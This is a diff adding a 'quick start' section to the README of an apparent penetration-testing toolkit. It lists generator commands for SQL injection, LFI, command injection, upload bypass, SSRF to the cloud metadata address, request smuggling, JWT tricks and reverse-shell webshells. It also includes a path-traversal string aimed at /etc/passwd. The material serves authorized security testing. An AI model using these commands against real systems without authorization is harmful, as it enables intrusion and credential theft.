@@ -2,6 +2,32 @@
 
 > **Which access surface?** You're in `access/web/` — a **web app** to break. Siblings: `../network/` (a **cred / network / AD / cloud** way in) · `../services/` (a **service left open**). All → a shell → then `../../winpriv/`/`../../linpriv/`. (See `../../START-HERE.md`.)
 
+## 🚀 5-minute quick start — pick a bug class, get a shell
+
+Beginner path — for each vuln class, one generator prints the runnable command:
+
+```bash
+# 0) You already know the web-app fingerprint from `../network/enum_net.py --web`
+#    (whatweb / httpx / nuclei / ffuf). Pick the bug class you have evidence for:
+
+python3 gen_sqli.py    --url 'http://target/login?u=' --dbms mysql           # SQLi → xp_cmdshell / RCE / cred dump
+python3 gen_lfi.py     --url 'http://target/page.php?f=' --wrapper php      # LFI → source disclosure / RCE via log-poison / phpfilter chain
+python3 gen_rce.py     --url 'http://target/api/exec'   --tech blind|inband # command injection templates
+python3 gen_upload.py  --url 'http://target/upload'     --ext php,phtml     # upload bypass chains (double-ext, magic-byte, .htaccess, race)
+python3 gen_ssrf.py    --url 'http://target/fetch?u='   --target 169.254.169.254   # SSRF → metadata / internal-only services
+python3 gen_smuggle.py --url 'http://target/'           --technique clte|tecl      # request smuggling
+python3 gen_jwt.py     --token '<jwt>'                                       # JWT alg/none/kid tricks
+python3 gen_api.py     --spec swagger.json                                   # REST/GraphQL abuse (IDOR, mass assignment)
+python3 gen_webshell.py --lang php|jsp|aspx --lhost <ip> --lport 443         # after upload/RCE lands, drop a real shell
+```
+
+**Every generator prints commands; nothing is fired for you.** Paste the printed block, watch what happens, iterate. When you land code exec, close the loop with `gen_webshell.py` for a stable revshell → `../../winpriv/` or `../../linpriv/`.
+
+**Rules of engagement to remember:**
+- SQLi / LFI test payloads are noisy — coordinate scan windows.
+- Blind exploitation (blind SQLi, blind RCE) = pick canaries the client can allowlist (a unique DNS token).
+- Don't send `..%2e%2e/etc/passwd` at prod without a signed-off ROE.
+
 **Get a shell by exploiting an app-layer vulnerability.** Sister to `../network/` (shell via creds/spray/network
 services). The generators run on YOUR box and *print* payloads/commands; the shell you land feeds `winpriv`/
 `linpriv` + `report/`. **Authorized engagements only.** Everything here is AV/WAF-signatured to some degree —
